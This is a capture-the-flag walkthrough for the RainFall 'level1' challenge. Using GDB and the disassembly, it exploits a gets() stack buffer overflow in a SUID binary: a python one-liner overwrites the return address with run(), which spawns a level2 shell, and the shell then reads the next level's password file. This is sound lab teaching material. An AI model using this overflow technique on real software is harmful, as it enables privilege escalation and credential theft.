# Level1
Level1 introduce buffer overflow attacks

# Tools
GDB

# Walkthrough
The home of `level1` contains a SUID bit binary file, owned by `level2`:
```
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
```

Upon checking the `level1` binary with GDB and disassembling main, we see the code in the `main.asm` file. 

This code calls a really dangerous function, `gets`. `gets` doesn't perform any checks before writing to its buffer, thus someone that would write a long string inside of `gets` would pretty easily buffer overflow the stack, and could leverage that to execute arbitrary code.

Let's dissect the assembly code a little more to better understand the program:
```x86
   0x08048480 <+0>:	push   ebp ; First two lines are the prologue, prepare the
   0x08048481 <+1>:	mov    ebp,esp ; stack frame for the main function to be executed
   0x08048483 <+3>:	and    esp,0xfffffff0 ; 
   0x08048486 <+6>:	sub    esp,0x50 ; Allows 80 bytes for the buffer
   0x08048489 <+9>:	lea    eax,[esp+0x10] ; Prepare the stack to receive data
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax ; Prepare the stack to receive data
   0x08048490 <+16>:	call   0x8048340 <gets@plt> ; Calls gets()
   0x08048495 <+21>:	leave ; Setup to return control to the caller
   0x08048496 <+22>:	ret ; Setup to return control to the caller
```

Okay, apart from the `gets` call there is nothing too fancy, but maybe the program calls other functions?
Using [dogbolt](https://dogbolt.org/), we can reverse engineer the binary.
We see that the program also contains a function `run()`:
```c
int run()
{
  fwrite("Good... Wait what?\n", 1u, 0x13u, stdout);
  return system("/bin/sh");
}
```
As we can see, the `run()` commands prints a message and spawns a shell, with the privileges of level2 (file owner and SUID bit).

Using GDB, we can get the address of that function:
```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```
`run` is located at the address **0x08048444**. We want to setup our program so that when `gets()` returns and pops the return address of the caller, instead of getting the `leave` instruction from the `main`, it calls the `run` function.

To do that, we will make use of the stack buffer overflow. We know that the program allocates 80 bytes for the buffer of `gets()`.

We break on `main` and `gets`, and show the content of the stack:
```
(gdb) break main
Breakpoint 1 at 0x8048483
(gdb) break gets
Breakpoint 2 at 0x8048340
(gdb) run
Starting program: /home/user/level1/level1

Breakpoint 1, 0x08048483 in main ()
(gdb) c
Continuing.

Breakpoint 2, 0xb7e91e40 in gets () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/20x $esp
0xbffff6ac:	0x08048495	0xbffff6c0	0x0000002f	0xbffff70c
0xbffff6bc:	0xb7fd0ff4	0x080484a0	0x0804978c	0x00000001
0xbffff6cc:	0x08048321	0xb7fd13e4	0x00000016	0x0804978c
0xbffff6dc:	0x080484c1	0xffffffff	0xb7e5edc6	0xb7fd0ff4
0xbffff6ec:	0xb7e5ee55	0xb7fed280	0x00000000	0x080484a9
``` 
The first double word of data is the address of the return value of the main function. Thus, we know that, just before filling out the buffer, we need to write out the address of the `run` function to call it.

We write 76 A and then the address of the `run` function in reverse order because of the little endian of the system. 
```bash
python -c 'print("A"*76 + "\x44\x84\x04\x08")' > attack.txt; ./level1 < attack.txt; rm -rf attack.txt
```

That segfaults, because Bash still reads on STDIN which is closed. Thus, we need to maintain STDIN opened after we inputed our payload:

```bash
python -c 'print("A"*76 + "\x44\x84\x04\x08")' > attack.txt; cat attack.txt - | ./level1; rm -rf attack.txt
```

```bash
level1@RainFall:~$ python -c 'print("A"*76 + "\x44\x84\x04\x08")' > attack.txt; cat attack.txt - | ./level1; rm -rf attack.txt
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```


# Sources
[Tutorial on GDB and Stack Buffer Overflow](https://eric-lo.gitbook.io/stack-smashing-attack/asm)
